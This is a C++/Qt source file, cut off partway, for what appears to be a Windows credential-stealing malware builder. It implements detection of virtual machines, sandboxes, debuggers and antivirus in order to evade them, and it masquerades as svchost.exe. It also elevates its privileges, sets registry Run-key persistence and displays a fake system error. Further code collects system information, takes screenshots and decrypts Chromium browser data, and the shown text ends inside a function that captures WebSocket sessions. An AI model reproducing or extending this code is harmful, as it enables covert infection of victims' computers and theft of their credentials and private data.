#include <windows.h>
#include <ntstatus.h> // Добавлено для NT_SUCCESS
#include <iostream>
#include <fstream>
#include <sstream>
#include <string>
#include <vector>
#include <regex>
#include <gdiplus.h>
#include <tlhelp32.h>
#include <iphlpapi.h>
#include <wininet.h>
#include <psapi.h>
#include <shlobj.h>
#include <sqlite3.h>
#include <wincrypt.h>
#include <urlmon.h>
#include <filesystem>
#include <random>
#include <time.h>
#include <zip.h>
#include <QApplication>
#include <QMainWindow>
#include <QThread>
#include <QNetworkAccessManager>
#include <QNetworkRequest>
#include <QNetworkReply>
#include <QHttpMultiPart>
#include <QFile>
#include <QFileDialog>
#include <QMessageBox>
#include <QSettings>
#include <mutex>
#include <thread>
#include <memoryapi.h>
#include <bcrypt.h>

#include "mainwindow.h"
#include "build_key.h"
#include "polymorphic_code.h"
#include "junk_code.h"

// Переопределение типов для совместимости
typedef enum _THREADINFOCLASS {
    ThreadBasicInformation = 0,
    ThreadQuerySetWin32StartAddress = 9
} THREADINFOCLASS;

typedef struct _THREAD_BASIC_INFORMATION {
    NTSTATUS ExitStatus;
    PVOID TebBaseAddress;
    ULONG_PTR ClientId;
    ULONG_PTR AffinityMask;
    LONG Priority;
    LONG BasePriority;
} THREAD_BASIC_INFORMATION, *PTHREAD_BASIC_INFORMATION;

// Глобальные переменные
std::mutex g_mutex;
MainWindow* g_mainWindow = nullptr;
Gdiplus::GdiplusStartupInput gdiplusStartupInput;
ULONG_PTR gdiplusToken;

// Реализация шифрования данных
std::string EncryptData(const std::string& data, const std::string& key1, const std::string& key2, const std::string& salt) {
    if (data.empty() || key1.empty() || key2.empty() || salt.empty()) {
        throw std::runtime_error("Encryption parameters cannot be empty");
    }

    // Получаем ключи и IV из build_key.h
    std::array<unsigned char, 16> encryptionKey1 = GetStaticEncryptionKey(key1);
    std::array<unsigned char, 16> encryptionKey2 = GetStaticEncryptionKey(key2);
    std::array<unsigned char, 16> iv = GenerateIV();

    // Объединяем ключи
    std::vector<unsigned char> combinedKey(32); // Для AES-256 нужно 32 байта
    std::copy(encryptionKey1.begin(), encryptionKey1.end(), combinedKey.begin());
    std::copy(encryptionKey2.begin(), encryptionKey2.end(), combinedKey.begin() + 16);

    BCRYPT_ALG_HANDLE hAlg = nullptr;
    BCRYPT_KEY_HANDLE hKey = nullptr;
    NTSTATUS status;

    // Открываем алгоритм AES
    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0);
    if (!BCRYPT_SUCCESS(status)) {
        throw std::runtime_error("Failed to open AES algorithm provider: " + std::to_string(status));
    }

    // Устанавливаем режим CBC
    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        throw std::runtime_error("Failed to set chaining mode: " + std::to_string(status));
    }

    // Генерируем ключ
    status = BCryptGenerateSymmetricKey(hAlg, &hKey, nullptr, 0, combinedKey.data(), combinedKey.size(), 0);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        throw std::runtime_error("Failed to generate symmetric key: " + std::to_string(status));
    }

    // Подготавливаем данные для шифрования
    DWORD cbData = 0, cbResult = 0;
    status = BCryptEncrypt(hKey, (PUCHAR)data.data(), data.size(), nullptr, iv.data(), iv.size(), nullptr, 0, &cbData, BCRYPT_BLOCK_PADDING);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        throw std::runtime_error("Failed to calculate encrypted data size: " + std::to_string(status));
    }

    std::vector<BYTE> encryptedData(cbData);
    status = BCryptEncrypt(hKey, (PUCHAR)data.data(), data.size(), nullptr, iv.data(), iv.size(), encryptedData.data(), cbData, &cbResult, BCRYPT_BLOCK_PADDING);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        throw std::runtime_error("Failed to encrypt data: " + std::to_string(status));
    }

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);

    // Преобразуем зашифрованные данные в строку (base64 для удобства)
    DWORD base64Size = 0;
    CryptBinaryToStringA(encryptedData.data(), cbResult, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, nullptr, &base64Size);
    std::vector<char> base64Data(base64Size);
    CryptBinaryToStringA(encryptedData.data(), cbResult, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, base64Data.data(), &base64Size);

    return std::string(base64Data.data(), base64Size - 1); // Убираем завершающий \0
}

// Реализация дешифрования данных
std::string DecryptData(const std::string& encryptedData) {
    if (encryptedData.empty()) {
        return "";
    }

    if (!g_mainWindow) {
        return "";
    }

    std::string key1 = g_mainWindow->config.encryptionKey1;
    std::string key2 = g_mainWindow->config.encryptionKey2;
    std::string salt = g_mainWindow->config.encryptionSalt;

    if (key1.empty() || key2.empty() || salt.empty()) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->emitLog(QString("Decryption keys or salt are empty"));
        return "";
    }

    // Получаем ключи и IV
    std::array<unsigned char, 16> encryptionKey1 = GetStaticEncryptionKey(key1);
    std::array<unsigned char, 16> encryptionKey2 = GetStaticEncryptionKey(key2);
    std::array<unsigned char, 16> iv = GenerateIV();

    // Объединяем ключи
    std::vector<unsigned char> combinedKey(32);
    std::copy(encryptionKey1.begin(), encryptionKey1.end(), combinedKey.begin());
    std::copy(encryptionKey2.begin(), encryptionKey2.end(), combinedKey.begin() + 16);

    // Декодируем base64
    DWORD binarySize = 0;
    CryptStringToBinaryA(encryptedData.c_str(), encryptedData.size(), CRYPT_STRING_BASE64, nullptr, &binarySize, nullptr, nullptr);
    std::vector<BYTE> binaryData(binarySize);
    CryptStringToBinaryA(encryptedData.c_str(), encryptedData.size(), CRYPT_STRING_BASE64, binaryData.data(), &binarySize, nullptr, nullptr);

    BCRYPT_ALG_HANDLE hAlg = nullptr;
    BCRYPT_KEY_HANDLE hKey = nullptr;
    NTSTATUS status;

    // Открываем алгоритм AES
    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0);
    if (!BCRYPT_SUCCESS(status)) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Failed to open AES algorithm provider for decryption: " + std::to_string(status)));
        return "";
    }

    // Устанавливаем режим CBC
    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Failed to set chaining mode for decryption: " + std::to_string(status)));
        return "";
    }

    // Генерируем ключ
    status = BCryptGenerateSymmetricKey(hAlg, &hKey, nullptr, 0, combinedKey.data(), combinedKey.size(), 0);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Failed to generate symmetric key for decryption: " + std::to_string(status)));
        return "";
    }

    // Дешифруем данные
    DWORD cbData = 0, cbResult = 0;
    status = BCryptDecrypt(hKey, binaryData.data(), binarySize, nullptr, iv.data(), iv.size(), nullptr, 0, &cbData, BCRYPT_BLOCK_PADDING);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Failed to calculate decrypted data size: " + std::to_string(status)));
        return "";
    }

    std::vector<BYTE> decryptedData(cbData);
    status = BCryptDecrypt(hKey, binaryData.data(), binarySize, nullptr, iv.data(), iv.size(), decryptedData.data(), cbData, &cbResult, BCRYPT_BLOCK_PADDING);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Failed to decrypt data: " + std::to_string(status)));
        return "";
    }

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);

    return std::string((char*)decryptedData.data(), cbResult);
}

// Проверка на виртуальную машину
bool CheckVirtualEnvironment() {
    bool isVM = false;

    // Проверка реестра на наличие идентификаторов виртуальных машин
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char value[256] = {0};
        DWORD size = sizeof(value);
        if (RegQueryValueExA(hKey, "Identifier", nullptr, nullptr, (LPBYTE)value, &size) == ERROR_SUCCESS) {
            std::string identifier(value);
            if (identifier.find("VBOX") != std::string::npos || identifier.find("VMWARE") != std::string::npos ||
                identifier.find("QEMU") != std::string::npos || identifier.find("VIRTUAL") != std::string::npos) {
                std::lock_guard<std::mutex> lock(g_mutex);
                if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("VM detected via SCSI identifier: " + identifier));
                isVM = true;
            }
        }
        RegCloseKey(hKey);
    }

    // Проверка наличия модулей песочницы или отладчика
    if (GetModuleHandleA("SbieDll.dll")) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->emitLog(QString("Sandboxie detected (SbieDll.dll)"));
        isVM = true;
    }
    if (GetModuleHandleA("dbghelp.dll")) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->emitLog(QString("Debugger detected (dbghelp.dll)"));
        isVM = true;
    }

    // Проверка системной информации
    SYSTEM_INFO sysInfo{};
    GetSystemInfo(&sysInfo);
    if (sysInfo.dwNumberOfProcessors <= 2) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Low processor count detected: " + std::to_string(sysInfo.dwNumberOfProcessors)));
        isVM = true;
    }

    MEMORYSTATUSEX memStatus{};
    memStatus.dwLength = sizeof(memStatus);
    GlobalMemoryStatusEx(&memStatus);
    if (memStatus.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Low memory detected: " + std::to_string(memStatus.ullTotalPhys / (1024 * 1024)) + " MB"));
        isVM = true;
    }

    // Проверка времени выполнения
    LARGE_INTEGER freq{}, start{}, end{};
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&start);
    for (volatile int i = 0; i < 100000; i++);
    QueryPerformanceCounter(&end);
    double elapsed = (end.QuadPart - start.QuadPart) * 1000.0 / freq.QuadPart;
    if (elapsed > 50) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Suspicious execution time detected: " + std::to_string(elapsed) + " ms"));
        isVM = true;
    }

    // Проверка MAC-адреса
    ULONG bufferSize = 15000;
    std::vector<char> buffer(bufferSize);
    PIP_ADAPTER_INFO adapterInfo = reinterpret_cast<PIP_ADAPTER_INFO>(buffer.data());
    if (GetAdaptersInfo(adapterInfo, &bufferSize) == NO_ERROR) {
        for (PIP_ADAPTER_INFO adapter = adapterInfo; adapter; adapter = adapter->Next) {
            std::string mac;
            for (unsigned int i = 0; i < adapter->AddressLength; i++) {
                char macByte[3];
                sprintf_s(macByte, "%02X", adapter->Address[i]);
                mac += macByte;
                if (i < adapter->AddressLength - 1) mac += "-";
            }
            if (mac.find("00-50-56") != std::string::npos || // VMware
                mac.find("00-0C-29") != std::string::npos || // VMware
                mac.find("00-1C-14") != std::string::npos || // VMware
                mac.find("00-05-69") != std::string::npos || // VMware
                mac.find("08-00-27") != std::string::npos) { // VirtualBox
                std::lock_guard<std::mutex> lock(g_mutex);
                if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("VM MAC address detected: " + mac));
                isVM = true;
            }
        }
    }

    // Проверка специфических драйверов
    const char* vmDrivers[] = {"VBoxDrv.sys", "vmci.sys", "vmhgfs.sys", "vmmemctl.sys", nullptr};
    for (int i = 0; vmDrivers[i]; i++) {
        std::string driverPath = "C:\\Windows\\System32\\drivers\\" + std::string(vmDrivers[i]);
        if (std::filesystem::exists(driverPath)) {
            std::lock_guard<std::mutex> lock(g_mutex);
            if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("VM driver detected: " + std::string(vmDrivers[i])));
            isVM = true;
        }
    }

    return isVM;
}

// Проверка на отладчик или антивирус
bool CheckDebuggerOrAntivirus() {
    if (IsDebuggerPresent()) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->emitLog(QString("Debugger detected via IsDebuggerPresent"));
        return true;
    }

    typedef NTSTATUS(NTAPI *pNtQueryInformationThread)(HANDLE, THREADINFOCLASS, PVOID, ULONG, PULONG);
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->emitLog(QString("Failed to load ntdll.dll for NtQueryInformationThread"));
        return false;
    }

    pNtQueryInformationThread NtQueryInformationThread = reinterpret_cast<pNtQueryInformationThread>(
        GetProcAddress(hNtdll, "NtQueryInformationThread"));
    if (!NtQueryInformationThread) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->emitLog(QString("Failed to get NtQueryInformationThread address"));
        return false;
    }

    THREAD_BASIC_INFORMATION tbi{};
    NTSTATUS status = NtQueryInformationThread(GetCurrentThread(), ThreadBasicInformation, &tbi, sizeof(tbi), nullptr);
    if (NT_SUCCESS(status) && tbi.TebBaseAddress) {
        DWORD debugPort = 0;
        status = NtQueryInformationThread(GetCurrentThread(), ThreadQuerySetWin32StartAddress, &debugPort, sizeof(debugPort), nullptr);
        if (NT_SUCCESS(status) && debugPort != 0) {
            std::lock_guard<std::mutex> lock(g_mutex);
            if (g_mainWindow) g_mainWindow->emitLog(QString("Debugger detected via NtQueryInformationThread"));
            return true;
        }
    }

    const char* avProcesses[] = {
        "avp.exe", "MsMpEng.exe", "avgui.exe", "egui.exe", "McTray.exe",
        "norton.exe", "avastui.exe", "kav.exe", "wireshark.exe", "ollydbg.exe", nullptr
    };
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->emitLog(QString("Failed to create process snapshot for AV check"));
        return false;
    }

    PROCESSENTRY32W pe32{};
    pe32.dwSize = sizeof(pe32);
    bool avDetected = false;
    if (Process32FirstW(hProcessSnap, &pe32)) {
        do {
            for (int i = 0; avProcesses[i]; i++) {
                std::wstring wAvProcess(avProcesses[i], avProcesses[i] + strlen(avProcesses[i]));
                if (_wcsicmp(pe32.szExeFile, wAvProcess.c_str()) == 0) {
                    std::lock_guard<std::mutex> lock(g_mutex);
                    if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Antivirus process detected: " + std::string(avProcesses[i])));
                    avDetected = true;
                    break;
                }
            }
        } while (Process32NextW(hProcessSnap, &pe32) && !avDetected);
    }
    CloseHandle(hProcessSnap);
    return avDetected;
}

// Антианализ
bool AntiAnalysis() {
    if (!g_mainWindow) return false;

    if (g_mainWindow->config.antiVM && CheckVirtualEnvironment()) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->emitLog(QString("Virtual machine detected, exiting"));
        return true;
    }

    if (CheckDebuggerOrAntivirus()) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->emitLog(QString("Debugger or Antivirus detected, exiting"));
        return true;
    }

    LARGE_INTEGER freq{}, start{}, end{};
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&start);
    for (volatile int i = 0; i < 1000000; i++);
    QueryPerformanceCounter(&end);
    double elapsed = (end.QuadPart - start.QuadPart) * 1000.0 / freq.QuadPart;
    if (elapsed > 100) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Suspicious execution time detected: " + std::to_string(elapsed) + " ms, exiting"));
        return true;
    }

    HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hThreadSnap != INVALID_HANDLE_VALUE) {
        THREADENTRY32 te32{};
        te32.dwSize = sizeof(te32);
        int threadCount = 0;
        if (Thread32First(hThreadSnap, &te32)) {
            do {
                if (te32.th32OwnerProcessID == GetCurrentProcessId()) threadCount++;
            } while (Thread32Next(hThreadSnap, &te32));
        }
        CloseHandle(hThreadSnap);
        if (threadCount > 50) {
            std::lock_guard<std::mutex> lock(g_mutex);
            if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Too many threads detected: " + std::to_string(threadCount) + ", exiting"));
            return true;
        }
    } else {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->emitLog(QString("Failed to create thread snapshot for anti-analysis"));
    }

    char processName[MAX_PATH] = {0};
    GetModuleFileNameA(nullptr, processName, MAX_PATH);
    std::string procName = std::filesystem::path(processName).filename().string();
    if (procName.find("analyzer") != std::string::npos || procName.find("sandbox") != std::string::npos) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Suspicious process name detected: " + procName + ", exiting"));
        return true;
    }

    return false;
}

// Маскировка процесса
void MaskProcess() {
    HANDLE hProcess = GetCurrentProcess();
    SetPriorityClass(hProcess, HIGH_PRIORITY_CLASS);
    wchar_t systemPath[MAX_PATH] = {0};
    GetSystemDirectoryW(systemPath, MAX_PATH);
    wcscat_s(systemPath, L"\\svchost.exe");
    SetFileAttributesW(systemPath, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN);

    typedef NTSTATUS(NTAPI *pNtSetInformationProcess)(HANDLE, DWORD, PVOID, ULONG);
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->emitLog(QString("Failed to load ntdll.dll for NtSetInformationProcess"));
        return;
    }

    pNtSetInformationProcess NtSetInformationProcess = reinterpret_cast<pNtSetInformationProcess>(
        GetProcAddress(hNtdll, "NtSetInformationProcess"));
    if (!NtSetInformationProcess) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->emitLog(QString("Failed to get NtSetInformationProcess address"));
        return;
    }

    wchar_t fakeName[] = L"svchost.exe";
    NTSTATUS status = NtSetInformationProcess(hProcess, 0x1C, fakeName, sizeof(fakeName));
    if (NT_SUCCESS(status)) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->emitLog(QString("Process masked as svchost.exe"));
    } else {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->emitLog(QString("Failed to mask process: " + QString::number(status)));
    }
}

// Повышение привилегий и скрытие
void Stealth() {
    if (!g_mainWindow || !g_mainWindow->config.silent) return;

    SetFileAttributesA(GetCommandLineA(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    MaskProcess();

    HANDLE hToken = nullptr;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {
        TOKEN_PRIVILEGES tp{};
        tp.PrivilegeCount = 1;
        LookupPrivilegeValue(nullptr, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), nullptr, nullptr);
        CloseHandle(hToken);
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->emitLog(QString("Privileges elevated"));
    } else {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->emitLog(QString("Failed to elevate privileges"));
    }
}

// Добавление в автозапуск
void AddToStartup() {
    if (!g_mainWindow || !g_mainWindow->config.autoStart) return;

    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        char path[MAX_PATH] = {0};
        GetModuleFileNameA(nullptr, path, MAX_PATH);
        RegSetValueExA(hKey, "svchost", 0, REG_SZ, (BYTE*)path, strlen(path) + 1);
        RegCloseKey(hKey);
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->emitLog(QString("Added to startup (HKEY_CURRENT_USER)"));
    } else {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->emitLog(QString("Failed to add to startup (HKEY_CURRENT_USER)"));
    }
}

// Обеспечение персистентности
void Persist() {
    if (!g_mainWindow || !g_mainWindow->config.persist) return;

    AddToStartup();
    HKEY hKey;
    if (RegCreateKeyA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey) == ERROR_SUCCESS) {
        char path[MAX_PATH] = {0};
        GetModuleFileNameA(nullptr, path, MAX_PATH);
        RegSetValueExA(hKey, "SystemService", 0, REG_SZ, (BYTE*)path, strlen(path) + 1);
        RegCloseKey(hKey);
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->emitLog(QString("Persisted in HKEY_LOCAL_MACHINE"));
    } else {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->emitLog(QString("Failed to persist (HKEY_LOCAL_MACHINE)"));
    }
}

// Отображение фейковой ошибки
void FakeError() {
    if (!g_mainWindow || !g_mainWindow->config.fakeError) return;

    MessageBoxA(nullptr, "System Error: svchost.exe has stopped working.", "System Error", MB_ICONERROR);
    std::lock_guard<std::mutex> lock(g_mutex);
    if (g_mainWindow) g_mainWindow->emitLog(QString("Displayed fake error message"));
}

// Получение версии ОС через RtlGetVersion
typedef NTSTATUS(WINAPI *RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
bool GetOSVersion(RTL_OSVERSIONINFOW& osInfo) {
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) {
        return false;
    }

    RtlGetVersionPtr RtlGetVersion = (RtlGetVersionPtr)GetProcAddress(hNtdll, "RtlGetVersion");
    if (!RtlGetVersion) {
        return false;
    }

    osInfo.dwOSVersionInfoSize = sizeof(RTL_OSVERSIONINFOW);
    return RtlGetVersion(&osInfo) == 0;
}

// Получение системной информации
std::string GetCustomSystemInfo() {
    if (!g_mainWindow || !g_mainWindow->config.systemInfo) return "";

    std::string result;
    char username[256] = {0};
    DWORD usernameLen = sizeof(username);
    if (GetUserNameA(username, &usernameLen)) {
        result += "Username: " + std::string(username) + "\n";
    } else {
        result += "Username: Unknown\n";
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->emitLog(QString("Failed to get username"));
    }

    char computerName[256] = {0};
    DWORD computerNameLen = sizeof(computerName);
    if (GetComputerNameA(computerName, &computerNameLen)) {
        result += "Computer Name: " + std::string(computerName) + "\n";
    } else {
        result += "Computer Name: Unknown\n";
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->emitLog(QString("Failed to get computer name"));
    }

    SYSTEM_INFO sysInfo{};
    GetSystemInfo(&sysInfo);
    result += "Processor Architecture: " + std::to_string(sysInfo.wProcessorArchitecture) + "\n";
    result += "Number of Processors: " + std::to_string(sysInfo.dwNumberOfProcessors) + "\n";

    MEMORYSTATUSEX memInfo{};
    memInfo.dwLength = sizeof(memInfo);
    if (GlobalMemoryStatusEx(&memInfo)) {
        result += "Total Physical Memory: " + std::to_string(memInfo.ullTotalPhys / (1024 * 1024)) + " MB\n";
        result += "Available Physical Memory: " + std::to_string(memInfo.ullAvailPhys / (1024 * 1024)) + " MB\n";
    } else {
        result += "Memory Info: Unknown\n";
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->emitLog(QString("Failed to get memory info"));
    }

    RTL_OSVERSIONINFOW osInfo{};
    if (GetOSVersion(osInfo)) {
        result += "OS Version: " + std::to_string(osInfo.dwMajorVersion) + "." + std::to_string(osInfo.dwMinorVersion) + "\n";
        result += "Build Number: " + std::to_string(osInfo.dwBuildNumber) + "\n";
    } else {
        result += "OS Info: Unknown\n";
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->emitLog(QString("Failed to get OS version"));
    }

    ULONG bufferSize = 15000;
    std::vector<char> buffer(bufferSize);
    PIP_ADAPTER_INFO adapterInfo = reinterpret_cast<PIP_ADAPTER_INFO>(buffer.data());
    if (GetAdaptersInfo(adapterInfo, &bufferSize) == NO_ERROR) {
        for (PIP_ADAPTER_INFO adapter = adapterInfo; adapter; adapter = adapter->Next) {
            result += "Adapter Name: " + std::string(adapter->AdapterName) + "\n";
            result += "Description: " + std::string(adapter->Description) + "\n";
            result += "MAC Address: ";
            for (unsigned int i = 0; i < adapter->AddressLength; i++) {
                char mac[3];
                sprintf_s(mac, "%02X", adapter->Address[i]);
                result += mac;
                if (i < adapter->AddressLength - 1) result += "-";
            }
            result += "\nIP Address: " + std::string(adapter->IpAddressList.IpAddress.String) + "\n";
        }
    } else {
        result += "Network Info: Unknown\n";
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->emitLog(QString("Failed to get network adapters info"));
    }

    return result;
}

// Создание скриншота
std::string TakeScreenshot() {
    if (!g_mainWindow || !g_mainWindow->config.screenshot) return "";

    HDC hScreenDC = GetDC(nullptr);
    if (!hScreenDC) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->emitLog(QString("Failed to get screen DC"));
        return "";
    }

    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
    if (!hMemoryDC) {
        ReleaseDC(nullptr, hScreenDC);
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->emitLog(QString("Failed to create memory DC"));
        return "";
    }

    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
    if (!hBitmap) {
        DeleteDC(hMemoryDC);
        ReleaseDC(nullptr, hScreenDC);
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->emitLog(QString("Failed to create bitmap"));
        return "";
    }

    SelectObject(hMemoryDC, hBitmap);
    BitBlt(hMemoryDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY);
    Gdiplus::Bitmap bitmap(hBitmap, nullptr);
    CLSID clsid;
    HRESULT hr = CLSIDFromString(L"{557cf401-1a04-11d3-9a73-0000f81ef32e}", &clsid); // JPEG
    if (FAILED(hr)) {
        DeleteDC(hMemoryDC);
        ReleaseDC(nullptr, hScreenDC);
        DeleteObject(hBitmap);
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->emitLog(QString("Failed to get JPEG CLSID"));
        return "";
    }

    std::string screenshotName = "screenshot_" + std::to_string(GetTickCount()) + ".jpg";
    std::wstring screenshotNameW(screenshotName.begin(), screenshotName.end());
    hr = bitmap.Save(screenshotNameW.c_str(), &clsid, nullptr);
    if (FAILED(hr)) {
        screenshotName.clear();
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->emitLog(QString("Failed to save screenshot"));
    } else {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Screenshot saved: " + screenshotName));
    }

    DeleteDC(hMemoryDC);
    ReleaseDC(nullptr, hScreenDC);
    DeleteObject(hBitmap);
    return screenshotName;
}

// Дешифрование данных Chromium
std::string DecryptChromiumData(DATA_BLOB& encryptedData) {
    DATA_BLOB decryptedData{};
    if (CryptUnprotectData(&encryptedData, nullptr, nullptr, nullptr, nullptr, 0, &decryptedData)) {
        std::string result((char*)decryptedData.pbData, decryptedData.cbData);
        LocalFree(decryptedData.pbData);
        return result;
    }

    std::lock_guard<std::mutex> lock(g_mutex);
    if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Failed to decrypt Chromium data: " + std::to_string(GetLastError())));
    return "";
}

// Захват WebSocket сессий
std::string CaptureWebSocketSessions(const std::string& processName) {
    std::string result;
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->emitLog(QString("Failed to create process snapshot for WebSocket capture"));
        return result;
    }

    PROCESSENTRY32W pe32{};
    pe32.dwSize = sizeof(pe32);
    if (Process32FirstW(hProcessSnap, &pe32)) {
        do {
